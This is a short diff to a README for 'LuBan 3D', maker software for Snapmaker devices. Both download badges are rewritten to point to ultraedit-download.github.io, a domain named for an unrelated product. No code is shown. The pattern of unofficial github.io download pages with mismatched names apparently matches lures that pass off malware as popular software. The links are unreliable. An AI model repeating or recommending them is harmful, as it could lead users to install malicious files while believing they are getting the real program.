@@ -2,7 +2,7 @@
 
 LuBan 3D is an advanced software suite built for makers using Snapmaker devices. It combines slicing, laser engraving, CNC routing, and 3D modeling in a single, easy-to-use environment — perfect for creators and engineers seeking precision and control.
 
-[![Download LuBan 3D](https://img.shields.io/badge/Download-LuBan_3D-blueviolet)](https://luban-3d-download.github.io/.github)
+[![Download LuBan 3D](https://img.shields.io/badge/Download-LuBan_3D-blueviolet)](https://ultraedit-download.github.io/.github)
 
 ---
 
@@ -56,7 +56,7 @@ LuBan 3D is an advanced software suite built for makers using Snapmaker devices.
 
 ---
 
-[![Download LuBan 3D](https://img.shields.io/badge/Download-LuBan_3D-blueviolet)](https://luban-3d-download.github.io/.github)
+[![Download LuBan 3D](https://img.shields.io/badge/Download-LuBan_3D-blueviolet)](https://ultraedit-download.github.io/.github)
 
 ---
 
